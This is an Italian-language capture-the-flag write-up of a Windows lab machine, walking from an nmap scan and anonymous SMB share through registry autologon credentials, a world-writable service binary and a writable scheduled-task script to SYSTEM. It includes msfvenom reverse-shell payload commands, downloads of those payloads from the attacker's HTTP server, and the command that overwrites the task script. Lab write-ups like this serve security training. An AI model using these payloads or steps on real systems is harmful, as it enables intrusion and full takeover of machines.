# Windows Jump

Procediamo come di consueto a enumerare i servizi presenti nella macchina, per la prima volta il target è una macchina Windows, sarà interessante vedere la differenza.

```bash
kali@kali:~/Desktop/CTF/WindowsJump$ sudo nmap -sS -sV -sC -p- 10.128.156.84 -oN nmap.output
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: PRIVESC
|   NetBIOS_Domain_Name: PRIVESC
|   NetBIOS_Computer_Name: PRIVESC
|   DNS_Domain_Name: privesc
|   DNS_Computer_Name: privesc
|   Product_Version: 10.0.17763
|_  System_Time: 2026-10-31T23:30:15+00:00
|_ssl-date: 2026-10-31T23:30:23+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=privesc
| Not valid before: 2026-10-30T23:24:24
|_Not valid after:  2027-05-01T23:24:24
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-10-31T23:30:16
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

```

| Servizio | Porta | Versione |
| --- | --- | --- |
| msrpc (Microsoft RPC) | 135, 49664-49672 | - |
| smb | 139, 445 |  |
| rdp | 3389 |  |
| WinRM | 5985 |  |
| pando-pub | 7680 | Non rilevante |
| http | 47001 | Microsoft HTTPAPI httpd 2.0 |

Effettuiamo una scansione del **samba share** senza autenticazione

```bash
kali@kali:~/Desktop/CTF/WindowsJump$ smbclient -N -L //10.128.156.84            

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Public          Disk      Public file share
```

<aside>

`-N` login anonimo

`-L` List share

</aside>

E’ presente uno share `Public` proviamo ad accederci

```bash
kali@kali:~/Desktop/CTF/WindowsJump$ smbclient -N //10.128.156.84/Public
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon May 11 02:40:51 2026
  ..                                  D        0  Mon May 11 02:40:51 2026
  welcome.txt                         A      177  Mon May 11 02:40:50 2026

                7863807 blocks of size 4096. 3610517 blocks available
smb: \> get welcome.txt 

kali@kali:~/Desktop/CTF/WindowsJump$ cat welcome.txt 
Welcome to CORP-NET.

New employee default credentials
================================
Username : thmuser
Password : Password1!

Please change your password after first login.

```

E possiamo loggarci in `RDP` come user `thmuser` 

```bash
PS C:\Users\thmuser\Desktop> type .\flag1.txt
THM{5mb_**************}
```

Possiamo notare come è impostato l’autologon per l’utente `notadmin` 

```bash
PS C:\Users\thmuser.PRIVESC> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultUserName DefaultDomainName DefaultPassword AutoAdminLogon"
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    notadmin
    DefaultPassword    REG_SZ    powe
```

Permettendoci di vedere la password in chiaro! 

```bash
PS C:\Users\thmuser.PRIVESC> runas /user:PRIVESC\notadmin cmd.exe
Enter the password for PRIVESC\notadmin:
Attempting to start cmd.exe as user "PRIVESC\notadmin" ...
```

E otteniamo l’accesso all’utente **notadmin** e la flag2

```bash
PS C:\Windows\system32> type C:\Users\notadmin\Desktop\flag2.txt
THM{w1nl0g0n_******************}
```

vediamo che gira come svcadmin 

Il prossimo utente è `svcadmin` guardando i servizi a lui associati ne notiamo uno **Stopped**

```bash
PS C:\Windows\system32> Get-CimInstance Win32_Service | Where-Object { $_.StartName -like "*svcadmin*" } | Select-Object Name, DisplayName, StartName, State

Name   DisplayName            StartName  State
----   -----------            ---------  -----
THMSvc THM Background Service .\svcadmin Stopped
```

Guardando le caratteristiche del servizio

```bash
PS C:\Windows\system32> .\sc.exe qc "THMSvc"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMSvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\THMSVC\svc.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THM Background Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcadmin
PS C:\Windows\system32> icacls C:\Windows\THMSVC\svc.exe
C:\Windows\THMSVC\svc.exe Everyone:(F)
                          PRIVESC\notadmin:(I)(F)
                          BUILTIN\Administrators:(I)(F)
                          NT AUTHORITY\SYSTEM:(I)(F)

Successfully processed 1 files; Failed processing 0 files
PS C:\Windows\system32>
```

Esegue lo script `C:\Windows\THMSVC\svc.exe` che come vediamo tutti hanno il completo accesso `Everyone:(F)` quindi possiamo benissimo modificarlo!

```bash
kali@kali:~/Desktop/CTF/WindowsJump$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.131.79 LPORT=4445 -f exe-service -o rev-svc.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 5632 bytes
Saved as: rev-svc.exe

kali@kali:~/Desktop/CTF/WindowsJump$ python3 -m http.server 8000
```

E dalla macchina windows lo scarichiamo e lo sovrascriviamo al vecchio eseguibile

```bash
PS C:\Windows\THMSVC> wget 192.168.131.79:8000/rev-svc.exe -O rev-svc.exe
PS C:\Windows\THMSVC> move .\svc.exe .\svc.exe.bak
PS C:\Windows\THMSVC> move .\rev-svc.exe svc.exe   
PS C:\Windows\THMSVC> sc.exe start THMsvc

SERVICE_NAME: THMsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 2908
        FLAGS              :
PS C:\Windows\THMSVC>
```

Ottenendo con successo la reverse shell!

![image.png](Windows%20Jump/image.png)

E ottenendo la terza flag

```bash
PS C:\Users\svcadmin\Desktop> type flag3.txt
type flag3.txt
THM{s3rv1c3_******************}

```

Ora dobbiamo diventare `SYSTEM`

```bash
PS C:\Windows\Tasks> icacls cleanup.bat
icacls cleanup.bat
cleanup.bat BUILTIN\Users:(I)(RX)
            PRIVESC\svcadmin:(I)(M)
            BUILTIN\Administrators:(I)(F)
            NT AUTHORITY\SYSTEM:(I)(F)

Successfully processed 1 files; Failed processing 0 files

```

Possiamo modificare questo tasks! 

```bash
kali@kali:~/Desktop/CTF/WindowsJump$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.131.79 LPORT=4446 -f exe -o shell.exe          
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: shell.exe
                                                                                                                                                                                                                  
kali@kali:~/Desktop/CTF/WindowsJump$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

E da windows gli facciamo lanciare l’eseguibile quando scatta il task

```bash
PS C:\Windows\Tasks> wget http://192.168.131.79:8000/shell.exe -UseBasicParsing -OutFile shell.exe
wget http://192.168.131.79:8000/shell.exe -UseBasicParsing -OutFile shell.exe
PS C:\Windows\Tasks> dir
dir

    Directory: C:\Windows\Tasks

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        5/11/2026   6:41 AM             41 cleanup.bat                                                           
-a----        11/1/2026   2:25 PM           7680 shell.exe                                                             

PS C:\Windows\Tasks> cmd /c "echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\cleanup.bat"
cmd /c "echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\cleanup.bat"
```

```bash
C:\Windows\System32>type C:\flag4.txt
type C:\flag4.txt
THM{t4sk_******************}
```